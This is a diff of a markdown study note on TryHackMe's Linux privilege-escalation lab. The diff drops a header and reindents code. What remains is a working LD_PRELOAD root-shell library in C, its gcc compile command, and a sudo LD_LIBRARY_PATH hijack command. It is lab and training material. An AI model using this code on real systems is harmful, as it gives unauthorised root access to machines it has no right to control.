@@ -6,11 +6,6 @@ original_link: https://cardboard-iguana.com/log/2021-10-30-tryhackme-complete-be
 author: 100007
 ---
 
-# TryHackMe: Complete Beginner
-
-**author:** Nathan Acks  
-**date:** 2021-10-30
-
 # Linux PrivEsc
 
 ## Service Exploits
@@ -71,9 +66,9 @@ A simple malicious library (perhaps _the_ simplest) that can exploit the LD\_PRE
 #include <stdlib.h>
 
 void _init() {
-unsetenv("LD_PRELOAD");
-setresuid(0,0,0);
-system("/bin/bash -p");
+	unsetenv("LD_PRELOAD");
+	setresuid(0,0,0);
+	system("/bin/bash -p");
 }
 ```
 
@@ -81,7 +76,7 @@ Compile with:
 
 ```
 gcc -fPIC -shared -nostartfiles \
--o /path/to/malicious.so /path/to/malicious.c
+    -o /path/to/malicious.so /path/to/malicious.c
 ```
 
 Using LD\_LIBRARY\_PATH is a bit trickier; use ldd to see what libraries a program is already pulling in, and then name your malicious library after one of these. Then run `sudo LD_LIBRARY_PATH=/path/to/malicious/library program-runnable-with-nopasswd` to trick the program into loading your malicious library instead of the legitimate system library.
